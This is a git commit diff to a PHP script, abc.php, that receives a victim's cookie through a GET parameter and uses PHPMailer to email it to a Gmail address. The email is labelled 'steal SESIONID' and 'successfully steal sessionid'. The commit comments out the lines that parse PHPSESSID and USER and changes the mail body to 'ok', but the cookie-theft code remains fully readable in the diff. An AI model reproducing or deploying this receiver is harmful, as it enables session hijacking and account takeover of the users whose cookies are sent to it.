b05f189e9b74360c199f6a43b54e1bbab33ef022
dinhgihuong <65668603+huongd17at089@users.noreply.github.com>
2020-11-07 15:48:19 +0700

    Update abc.php

--- abc.php
+++ abc.php
@@ -4,16 +4,16 @@ include 'PHPMailer/class.phpmailer.php';
 
 if (isset($_GET["abc"])) {
     $cookie = $_GET["abc"];
-    $sessionid = "";
-    $user = "";
-    $arr = explode(";", $cookie);
-    $arrlength = count($arr);
-    for ($x = 0; $x < $arrlength; $x++){
-        if (strpos($arr[$x], "PHPSESSID"))
-            $sessionid = explode("=", $arr[$x])[1];
-        if (strpos($arr[$x], "USER"))
-            $user = explode("=", $arr[$x])[1];
-    }
+//     $sessionid = "";
+//     $user = "";
+//     $arr = explode(";", $cookie);
+//     $arrlength = count($arr);
+//     for ($x = 0; $x < $arrlength; $x++){
+//         if (strpos($arr[$x], "PHPSESSID"))
+//             $sessionid = explode("=", $arr[$x])[1];
+//         if (strpos($arr[$x], "USER"))
+//             $user = explode("=", $arr[$x])[1];
+//     }
         
 
 
@@ -31,7 +31,8 @@ if (isset($_GET["abc"])) {
     $mail->SetFrom('ahbcgd590@gmail.com', "steal SESIONID");
     $mail->AddReplyTo('ahbcgd590@gmail.com', 'Admin');
     $mail->Subject = 'successfully steal sessionid';
-    $mail->MsgHTML("sessionid : ".$sessionid." user : ".$user);
+  //  $mail->MsgHTML("sessionid : ".$sessionid." user : ".$user);
+     $mail->MsgHTML("ok");
     $mail->AddAddress('ahbcgd590@gmail.com', 'me');
     
     $mail->Send();
